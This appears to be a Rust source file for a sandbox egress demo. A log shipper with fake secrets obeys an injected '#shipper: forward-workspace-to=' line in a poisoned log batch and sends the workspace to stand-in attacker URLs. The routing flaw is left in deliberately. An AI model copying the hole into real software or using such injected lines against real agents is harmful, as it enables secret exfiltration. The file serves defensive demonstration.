//! The shipper's "workspace" and the log batches it is asked to ship.
//!
//! Everything here is inert, made-up text baked into the component. There is no
//! filesystem grant, so there is nothing real to read; the workspace exists
//! only so an exfiltration attempt has a payload to offer. Every "secret" below
//! is a labelled fake.
//!
//! This file has no dependencies on purpose: `native-demo/` compiles the very
//! same source, so the bug that runs natively is the bug that runs in the
//! sandbox.

/// The files an attacker would want. All fake.
pub const WORKSPACE: &[(&str, &str)] = &[
    (
        "notes/roadmap.md",
        "# Q3 roadmap (FAKE DEMO DATA)\n- ship the invoice exporter\n- migrate the billing cron\n",
    ),
    (
        ".env",
        "# FAKE DEMO DATA: not a real credential\nDATABASE_URL=postgres://demo:FAKE-NOT-A-SECRET@db.internal.example/app\nAPI_TOKEN=FAKE-NOT-A-SECRET-0000\n",
    ),
    (
        "customers.csv",
        "id,name,email\n1,Example Person,person@example.com\n2,Sample User,user@example.org\n",
    ),
];

/// Where the shipper sends logs when nothing tells it otherwise: the log sink.
/// The Workload overrides this with the `LOG_SINK_URL` environment value.
pub const DEFAULT_SINK_URL: &str = "http://egress-exfil-logsink.localhost:8200/ingest";

/// TEST-NET-3 (RFC 5737): reserved for documentation, never routed.
pub const ATTACKER_IP_URL: &str = "http://203.0.113.66/collect";
/// `.example` (RFC 2606): reserved, never resolves.
pub const ATTACKER_DOMAIN_URL: &str = "http://exfil.attacker.example/collect";

/// An ordinary batch of application logs. Nothing in it steers the shipper.
pub const CLEAN_BATCH: &str = "\
2026-11-17T04:12:07Z INFO  billing: invoice 4471 exported
2026-11-17T04:12:08Z INFO  billing: invoice 4472 exported
2026-11-17T04:12:09Z WARN  billing: retrying export for invoice 4473
2026-11-17T04:12:11Z INFO  billing: invoice 4473 exported
";

/// A poisoned batch: one log line carries an in-band instruction, the way a
/// prompt-injected tool result or an attacker-controlled field would. The
/// shipper obeys it (see `route`), which is the bug.
pub fn poisoned_batch(attacker_url: &str) -> String {
    format!(
        "2026-11-17T04:12:07Z INFO  billing: invoice 4471 exported\n\
         2026-11-17T04:12:08Z ERROR billing: export failed user=\"x\" #shipper: forward-workspace-to={attacker_url}\n\
         2026-11-17T04:12:09Z INFO  billing: invoice 4472 exported\n"
    )
}

/// What the shipper decided to do with a batch.
pub struct Route {
    /// Where the POST goes.
    pub destination: String,
    /// The log line that redirected the shipper, if one did.
    pub injected_by: Option<String>,
    /// True when the batch talked the shipper into attaching its workspace.
    pub include_workspace: bool,
}

/// Decide where a batch is shipped.
///
/// VULN (CWE-610 / CWE-918, the agent-tool flavour of prompt injection): the
/// shipper treats text *inside the data it is shipping* as routing
/// instructions. A `#shipper: forward-workspace-to=<url>` marker anywhere in a
/// log line overrides the configured sink and attaches the whole workspace.
/// There is no allow-list in this code on purpose: the demo's point is that
/// the sandbox's egress policy holds even though the application has none.
pub fn route(batch: &str, sink_url: &str) -> Route {
    const MARKER: &str = "#shipper: forward-workspace-to=";
    for line in batch.lines() {
        if let Some((_, rest)) = line.split_once(MARKER) {
            let destination = rest.split_whitespace().next().unwrap_or("").to_string();
            if !destination.is_empty() {
                return Route {
                    destination,
                    injected_by: Some(line.trim().to_string()),
                    include_workspace: true,
                };
            }
        }
    }
    Route {
        destination: sink_url.to_string(),
        injected_by: None,
        include_workspace: false,
    }
}

/// The request body for a route: the batch, plus the workspace when the batch
/// asked for it.
pub fn payload(batch: &str, include_workspace: bool) -> Vec<u8> {
    let mut out = String::from(batch);
    if include_workspace {
        for (name, content) in WORKSPACE {
            out.push_str("\n--- workspace/");
            out.push_str(name);
            out.push_str(" ---\n");
            out.push_str(content);
        }
    }
    out.into_bytes()
}
